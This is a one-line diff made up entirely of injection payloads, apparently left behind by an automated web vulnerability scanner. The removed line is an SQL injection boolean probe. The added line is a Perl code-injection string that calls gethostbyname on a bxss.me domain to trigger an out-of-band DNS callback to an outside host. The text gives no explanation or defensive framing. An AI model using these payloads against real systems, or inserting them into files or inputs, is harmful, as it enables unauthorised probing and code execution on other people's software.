@@ -1,1 +1,1 @@
--1' OR 2+322-322-1=0+0+0+1 or '1mTgp7kc'='
+'.gethostbyname(lc('hitzd'.'kxeomphm8df72.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(80).chr(97).chr(81).'
